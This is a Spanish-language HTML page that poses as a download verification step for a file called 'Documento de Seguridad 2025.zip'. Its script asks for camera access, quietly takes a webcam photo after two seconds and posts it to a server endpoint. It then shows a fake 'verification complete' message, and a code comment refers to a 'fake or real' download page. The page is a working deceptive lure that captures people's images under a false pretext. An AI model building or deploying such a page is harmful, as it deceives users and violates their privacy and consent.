<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación de Descarga</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      text-align: center;
      background-color: #2c3e50;
      color: #ecf0f1;
      padding: 40px;
    }
    .container {
      background-color: #34495e;
      border-radius: 10px;
      padding: 30px;
      margin: auto;
      max-width: 600px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }
    h1 {
      color: #3498db;
      font-size: 28px;
    }
    p {
      font-size: 16px;
      line-height: 1.6;
    }
    .file-info {
      background-color: #22303e;
      border-radius: 8px;
      padding: 15px;
      margin: 20px 0;
    }
    .file-info h2 {
      margin: 0;
      font-size: 20px;
      color: #95a5a6;
    }
    .file-info p {
      margin: 5px 0 0;
      font-size: 14px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #3498db;
      color: white;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #2980b9;
    }
    video {
      border: 2px solid #2980b9;
      border-radius: 8px;
      margin-top: 20px;
      display: none; /* Inicia oculto */
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Verificación para iniciar la descarga</h1>
  <p>Para proteger nuestros servidores de ataques de bots y garantizar una descarga segura, necesitamos realizar una verificación rápida.</p>
  
  <div class="file-info">
    <h2>Archivo: Documento de Seguridad 2025.zip</h2>
    <p>Tamaño: 1.2 MB</p>
  </div>
  
  <button id="capture">Verificar y Descargar</button>

  <video id="video" width="640" height="480" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>

</div>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const captureButton = document.getElementById('capture');

  captureButton.addEventListener('click', () => {
    // Muestra la ventana de la cámara
    video.style.display = 'block';

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photo = canvas.toDataURL('image/png');

            // Envía la foto al servidor
            fetch('/api/send-photo', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ photo })
            })
            .then(response => response.json())
            .then(data => {
              alert('Verificación completada. Tu descarga comenzará en breve.');
              console.log(data.message);
              // Aquí podrías redirigir a una página de descarga falsa o real.
            })
            .catch(err => {
              alert('Error en la verificación. Por favor, inténtalo de nuevo.');
              console.error(err);
            })
            .finally(() => {
              stream.getTracks().forEach(track => track.stop());
              video.style.display = 'none';
            });
          }, 2000); // Espera 2 segundos para que la cámara se inicie
        };
      })
      .catch(err => {
        alert('Por favor, permite el acceso a la cámara para la verificación.');
      });
  });
</script>

</body>
</html>
